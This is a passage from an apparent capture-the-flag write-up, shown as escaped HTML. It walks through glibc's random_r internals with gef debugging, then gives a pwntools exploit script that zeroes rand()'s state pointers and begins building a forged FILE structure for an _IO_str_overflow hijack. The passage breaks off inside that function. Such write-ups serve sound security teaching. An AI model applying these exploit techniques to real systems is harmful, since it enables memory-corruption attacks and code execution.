&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">__libc_lock_lock&lt;/span> (lock);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">void&lt;/span>) &lt;span style="color:#a6e22e">__random_r&lt;/span> (&lt;span style="color:#f92672">&amp;amp;&lt;/span>unsafe_state, &lt;span style="color:#f92672">&amp;amp;&lt;/span>retval);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">__libc_lock_unlock&lt;/span> (lock);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> retval;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>__random_r&lt;/code> is defined in &lt;code>stdlib/random_r.c&lt;/code> line &lt;code>353&lt;/code>&lt;sup id="fnref:11">&lt;a href="#fn:11" class="footnote-ref" role="doc-noteref">11&lt;/a>&lt;/sup>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">__random_r&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> random_data &lt;span style="color:#f92672">*&lt;/span>buf, &lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>state;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (buf &lt;span style="color:#f92672">==&lt;/span> NULL &lt;span style="color:#f92672">||&lt;/span> result &lt;span style="color:#f92672">==&lt;/span> NULL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> fail;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> state &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>rand_type &lt;span style="color:#f92672">==&lt;/span> TYPE_0)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> val &lt;span style="color:#f92672">=&lt;/span> state[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> ((state[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1103515245&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12345&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x7fffffff&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> state[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>fptr &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rptr &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>rptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>end_ptr &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>end_ptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int32_t&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>fptr &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Chucking least random bit. */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> (val &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x7fffffff&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>fptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (fptr &lt;span style="color:#f92672">&amp;gt;=&lt;/span> end_ptr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fptr &lt;span style="color:#f92672">=&lt;/span> state;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>rptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>rptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (rptr &lt;span style="color:#f92672">&amp;gt;=&lt;/span> end_ptr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rptr &lt;span style="color:#f92672">=&lt;/span> state;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fptr &lt;span style="color:#f92672">=&lt;/span> fptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>rptr &lt;span style="color:#f92672">=&lt;/span> rptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fail:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">__set_errno&lt;/span> (EINVAL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>At the beginning of the function there is a test for the random type, from code comments we see that there two types, if &lt;code>rand_type == TYPE_0&lt;/code> the old linear congruential bit will be used. Otherwise, the fancy trinomial stuff.&lt;/p>
&lt;p>We don&amp;rsquo;t know which one is beening used in our libc, we will use a debugger to figure it out.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">gef&amp;gt; disas random_r
Dump of assembler code for function random_r:
0x00007ffff7a47c40 &amp;lt;+0&amp;gt;: test rdi,rdi
0x00007ffff7a47c43 &amp;lt;+3&amp;gt;: je 0x7ffff7a47cc0 &amp;lt;random_r+128&amp;gt;
0x00007ffff7a47c45 &amp;lt;+5&amp;gt;: test rsi,rsi
0x00007ffff7a47c48 &amp;lt;+8&amp;gt;: je 0x7ffff7a47cc0 &amp;lt;random_r+128&amp;gt;
0x00007ffff7a47c4a &amp;lt;+10&amp;gt;: mov eax,DWORD PTR [rdi+0x18]
0x00007ffff7a47c4d &amp;lt;+13&amp;gt;: mov r8,QWORD PTR [rdi+0x10]
0x00007ffff7a47c51 &amp;lt;+17&amp;gt;: test eax,eax
0x00007ffff7a47c53 &amp;lt;+19&amp;gt;: je 0x7ffff7a47ca0 &amp;lt;random_r+96&amp;gt;
0x00007ffff7a47c55 &amp;lt;+21&amp;gt;: mov rax,QWORD PTR [rdi]
...
&lt;/code>&lt;/pre>&lt;p>The condition is at *&lt;em>random_r+17&lt;/em>, set a break point there and examin &lt;em>rax&lt;/em> register&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-none" data-lang="none">gef&amp;gt; run
...
gef&amp;gt; b *random_r+17
....
gef&amp;gt; continue
....
gef&amp;gt; info registers rax
rax 0x3 0x3
&lt;/code>&lt;/pre>&lt;p>The random type isn&amp;rsquo;t &lt;code>TYPE_0&lt;/code>, so the 2nd part of code will be used to compute the next random integer, it will be written to the 2nd parameter &lt;code>int32_t *result&lt;/code> which is the &lt;code>retval&lt;/code> variable in &lt;code>__random&lt;/code> function.&lt;/p>
&lt;p>the result is &lt;code>*result = (val &amp;gt;&amp;gt; 1) &amp;amp; 0x7fffffff&lt;/code> and &lt;code>val = *fptr += *rptr&lt;/code>, so in order to make &lt;code>rand()&lt;/code> return a 0 we need to overwrite &lt;code>*fptr&lt;/code> and &lt;code>*rptr&lt;/code> with zero (i.e. val = 0 =&amp;gt; *result = 0 ), those two pointer change after each call to random, we need to find the right ones for the right call, (e.g. if we want the 2nd call returns 0, we call rand once then debug the 2nd call to get the right pointers), this is the eays way to get them.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>fptr &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fptr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rptr &lt;span style="color:#f92672">=&lt;/span> buf&lt;span style="color:#f92672">-&amp;gt;&lt;/span>rptr;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This piece of code corespands to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> 0x7f7aa7c72c56 &amp;lt;random_r+22&amp;gt; mov eax, DWORD PTR &lt;span style="color:#f92672">[&lt;/span>rdi&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x7f7aa7c72c58 &amp;lt;random_r+24&amp;gt; mov rcx, QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rdi+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The values of &lt;code>fptr&lt;/code> and &lt;code>rptr&lt;/code> will &lt;code>rax&lt;/code> and &lt;code>rcx&lt;/code> respectivly&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef&amp;gt; b *random_r+24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef&amp;gt; i r rax rcx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rax 0x7f7aa7ffc0c4 0x7f7aa7ffc0c4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rcx 0x7f7aa7ffc0b8 0x7f7aa7ffc0b8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef➤ p 0x7f7aa7ffc0b8 - 0x00007f7aa7c38000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$1 &lt;span style="color:#f92672">=&lt;/span> 0x3c40b8
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the offset to &lt;code>*rptr&lt;/code> is &lt;code>0x3c40b8&lt;/code> while &lt;code>*fptr&lt;/code> is &lt;code>0x3c40c4&lt;/code>, &lt;em>12&lt;/em> bytes distance bitween them.&lt;/p>
&lt;p>We can overwrite this address with null value using the &lt;code>friends&lt;/code> pointer in &lt;code>profile&lt;/code> structure, we will use option one to increment it to points to &lt;code>*rptr&lt;/code>, overwrite with zero then do the same to &lt;code>*fptr&lt;/code>.&lt;/p>
&lt;p>The friends pointer is of type &lt;code>long long*&lt;/code> and it equals to 0 initialy, in pointer arithmetic for a given pointer &lt;code>x&lt;/code>, &lt;code>x + 5&lt;/code> actually is &lt;code>x + 5*sizeof(data_type)&lt;/code>, we have &lt;code>sizeof(long long) == 8&lt;/code>, so we increment friends pointer with &lt;code>(*rptr address) / 8&lt;/code>.&lt;/p>
&lt;h4 id="set-random-state-fptr-and-rptr-to-0">Set random state fptr and rptr to 0&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>random_state_offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x3c40b8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>random_state &lt;span style="color:#f92672">=&lt;/span> libc_base &lt;span style="color:#f92672">+&lt;/span> random_state_offset
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># set random_state fptr and rptr to 0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># in order to make rand() return 0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fptr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;you like to make? &amp;#34;&lt;/span>, str(random_state&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># logout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;4&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># login again with the same&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">11&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">11&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># rptr = rptr + 8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;you like to make? &amp;#34;&lt;/span>, str(&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># logout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;4&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># login again with the same uid&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Please enter your user ID: &amp;#34;&lt;/span>, str(uid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">11&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>T&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">11&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After that will login with a new userid in order to allocate a &lt;em>Zero Page&lt;/em> and write into it the forged &lt;em>FILE&lt;/em> structure.&lt;/p>
&lt;p>I used the same code in &lt;sup id="fnref1:6">&lt;a href="#fn:6" class="footnote-ref" role="doc-noteref">6&lt;/a>&lt;/sup> with little modification to make the &lt;em>FILE&lt;/em> structure.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">pack_file&lt;/span>(_flags&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_read_ptr&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_read_end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_read_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_write_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_write_ptr&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_write_end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_buf_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_buf_end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_save_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_backup_base&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_save_end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_marker&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _IO_chain&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _fileno&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _lock&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> struct &lt;span style="color:#f92672">=&lt;/span> p32(_flags) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p32(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_read_ptr) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_read_end) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_read_base) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_write_base) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_write_ptr) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_write_end) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_buf_base) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_buf_end) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_save_base) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_backup_base) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_save_end) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_marker) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p64(_IO_chain) &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p32(_fileno)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> struct &lt;span style="color:#f92672">=&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> struct &lt;span style="color:#f92672">+=&lt;/span> p64(_lock)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> struct &lt;span style="color:#f92672">=&lt;/span> struct&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0xd8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> struct
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">make_fake_file_struct&lt;/span>(libc_base, rip, rdi):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># We can only have even rdi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">assert&lt;/span>(rdi &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Crafting FILE structure&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># This stores the address of a pointer to the _IO_str_overflow function&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Libc specific&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> io_str_overflow_ptr_addr &lt;span style="color:#f92672">=&lt;/span> libc_base &lt;span style="color:#f92672">+&lt;/span> \
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;_IO_file_jumps&amp;#39;&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xd8&lt;/span>
